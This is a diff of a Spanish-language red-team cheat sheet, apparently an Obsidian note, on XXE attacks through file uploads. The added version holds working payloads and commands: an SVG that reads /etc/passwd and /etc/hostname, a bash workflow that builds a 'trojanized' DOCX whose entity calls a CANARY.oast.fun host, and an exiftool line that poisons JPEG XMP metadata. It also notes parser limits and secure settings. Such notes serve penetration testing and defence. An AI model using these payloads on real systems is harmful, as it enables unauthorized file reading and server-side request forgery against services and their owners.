@@ -1,19 +1,19 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/xxe
   - technique/execution
   - asset/web-app
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación]]'
 tertiary categories:
-  - "[[Web Explotación]]"
+  - '[[Web Explotación]]'
 kind: SubCheatSheet
 linked:
-  - "[[XML External Entity (XXE)]]"
+  - '[[XML External Entity (XXE)]]'
 ---
 # XXE - Carga de Archivos (Formatos XML Ocultos)
 
@@ -21,33 +21,78 @@ linked:
 
 ## Cheatsheet
 
-|**Formato Objetivo**|**Descripción de la Técnica**|**Estructura del Payload / Procedimiento**|
-|---|---|---|
-|**Imágenes Vectoriales (SVG)**|Los archivos SVG son inherentemente documentos XML. Incrusto la declaración de la entidad externa y la invoco dentro de un elemento de texto. Si el servidor renderiza la imagen (ej. genera un PNG a partir del SVG), el texto renderizado revelará el archivo extraído.|`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`|
-|**Documentos Ofimáticos (DOCX / XLSX)**|Estos formatos (Office Open XML) son contenedores ZIP con múltiples archivos XML internos. La técnica consiste en descomprimir el archivo legítimo, inyectar el payload en un XML analizado invariablemente por el parser (como `[Content_Types].xml` o `word/document.xml`), y volver a empaquetarlo como `.docx` o `.xlsx`.|**1.** `unzip archivo.docx`<br><br>  <br><br>**2.** Editar `[Content_Types].xml` y agregar: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://mi-servidor.com/ssrf"> ]>`<br><br>  <br><br>**3.** Invocar `&xxe;` en un atributo o nodo válido.<br><br>  <br><br>**4.** `zip -r archivo_modificado.docx *`|
-|**Metadatos incrustados (XMP)**|Formatos de imagen estáticos (JPEG, PNG, GIF) pueden contener metadatos XMP (Extensible Metadata Platform), el cual se basa en XML. Si la aplicación extrae metadatos (ej. usando ExifTool vulnerable), inyecto el payload XXE en los campos XMP usando herramientas de manipulación de metadatos.|Se inyecta la cabecera `<!DOCTYPE...>` en las etiquetas de metadatos XMP de una imagen válida y se fuerza al parser de metadatos del backend a evaluarla.|
-
-## Requisitos y Limitaciones
-
-- **Procesamiento Activo en Backend:** El ataque solo es viable si la aplicación procesa el archivo subido. Si el archivo se almacena directamente en un bucket de S3 o en el sistema de archivos sin que una librería abra y analice su contenido XML, el payload nunca se ejecutará.
-- **Naturaleza Ciega (Blind):** En la mayoría de los casos de carga de documentos ofimáticos o extracción de metadatos, la aplicación no refleja el contenido analizado en la respuesta HTTP (solo devuelve un mensaje de "Archivo subido correctamente"). Esto hace que el ataque sea inherentemente ciego, requiriendo el uso de técnicas de [[Blind XXE]] y exfiltración [[XXE Out-of-Band (OOB)]] para recuperar la información.
-- **Restricciones de Renderizado (SVG):** Para ataques _in-band_ con SVG, el servidor debe renderizar y devolver la imagen transformada (por ejemplo, como miniatura o avatar de perfil) para poder visualizar el texto extraído dentro del lienzo de la imagen.
-
-
----
-
+| **Comando / Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| Subir SVG con `<?xml ...?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg ...><text>&xxe;</text></svg>` | Texto renderizado del archivo en imagen output | Avatar/thumbnail que renderiza SVG (ImageMagick, librsvg). |
+| `unzip doc.docx && sed -i 's|<?xml version="1.0"|<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://CANARY">]><r>\&x;|' word/document.xml && zip -r poison.docx .` | DOCX trojanizado para SSRF/exfil al procesar | Backend parsea DOCX (Apache POI, python-docx, LibreOffice headless). |
+| Mismo procedimiento sobre `xl/workbook.xml` dentro de un `.xlsx` | XLSX malicioso | Backend acepta upload de planillas. |
+| `exiftool -xmp:title='<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;' image.jpg` | JPEG con metadata XMP envenenada | Backend lee XMP con parser XML vulnerable (ExifTool antiguo, ImageMagick). |
+| Subir `.wsdl` o `.xml` directamente con payload XXE | Exfil/SSRF en endpoints SOAP/import | Endpoint acepta WSDL/XML schema upload (import features). |
+| `.rss`/`.atom` con `<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | LFI/SSRF al parsear feed | Backend feed importer (RSS-to-blog, podcast importer). |
 ^xxe-carga-archivos
+
+### SVG con XXE (payload completo)
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
+  <text x="0" y="20" font-size="14">&xxe;</text>
+</svg>
+```
+
+### DOCX trojanizado — workflow
+
+```bash
+# 1. Descomprimir un .docx legítimo
+cp legit.docx poison.docx && cd /tmp/poison && unzip ../poison.docx
+
+# 2. Inyectar DOCTYPE en [Content_Types].xml o word/document.xml
+# Antes:  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+# Después:
+cat > word/document.xml.new <<'EOF'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "http://CANARY.oast.fun/docx-probe">]>
+EOF
+tail -n +2 word/document.xml >> word/document.xml.new
+mv word/document.xml.new word/document.xml
+
+# 3. Reempaquetar (NO usar 'zip -r' con compresión por default — preservar estructura)
+zip -r ../poison.docx . -x "*.DS_Store"
+
+# 4. Subir → verificar callback en Collaborator
+```
+
+### XMP en JPG con exiftool
+
+```bash
+exiftool \
+  -xmp:title='<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;' \
+  -overwrite_original photo.jpg
+file photo.jpg  # sigue siendo JPEG válido
+# Subir a backend que extrae XMP
+```
+
+___
 
 ## Overview
 
-La funcionalidad de carga de archivos presenta un vector de ataque encubierto para [[XXE]] cuando la aplicación acepta formatos que, bajo la superficie, están estructurados parcial o totalmente en XML. Formatos comunes como imágenes vectoriales (SVG) o documentos ofimáticos modernos (DOCX, XLSX, PPTX) dependen de analizadores XML en el backend para procesar contenido, renderizar imágenes o extraer metadatos.
+Aplicaciones que aceptan archivos "no-XML" en superficie pero los procesan con parsers XML internamente son vulnerables:
 
-Si el servidor utiliza una librería de procesamiento multimedia o de documentos (como ImageMagick, Apache POI, etc.) que no desactiva la resolución de entidades externas, puedo explotar la carga de archivos para lograr extracción de datos locales o un [[Server-Side Request Forgery (SSRF)]].
+- **SVG** — XML puro. Renderers como ImageMagick (`+convert`), librsvg, batik resuelven entities si la versión es antigua.
+- **DOCX/XLSX/PPTX (Office Open XML)** — zip + múltiples XML internos. Backends que extraen texto, generan previews, o procesan metadata son vulnerables.
+- **XMP en JPEG/PNG/GIF** — metadata embebida basada en RDF/XML. ExifTool legacy, ImageMagick, librerías de "smart cropping" pueden parsearla.
+- **WSDL/XSD/RSS/Atom** — import-from-URL features los pasan por parsers XML.
+- **`.xml`/`.wsdl` directos** — formularios de import legítimos.
 
+### Por qué frecuentemente Blind
 
-***
+La mayoría de estos endpoints **no devuelven el resultado del parse** — sólo "Upload OK". La técnica viable es [[XXE - Out-of-Band (OOB) y DTDs Externos]] con Collaborator, o SVG renderizado a PNG (in-band si el output incluye el texto extraído).
 
-## Notas Relacionadas
+### Limitaciones
 
+- **Strict parsers:** procesos modernos (Java con `XMLConstants.FEATURE_SECURE_PROCESSING=true`, .NET con `DtdProcessing=Prohibit`) ignoran el `DOCTYPE`.
+- **No-parse storage:** si el archivo se guarda en S3/disk sin procesar → no hay vector. Confirmar que el backend efectivamente abre y parsea.
+- **Zip estructura:** DOCX/XLSX necesitan que `[Content_Types].xml` no rompa la spec OOXML — modificar sin tocar relationships.
 
 ***
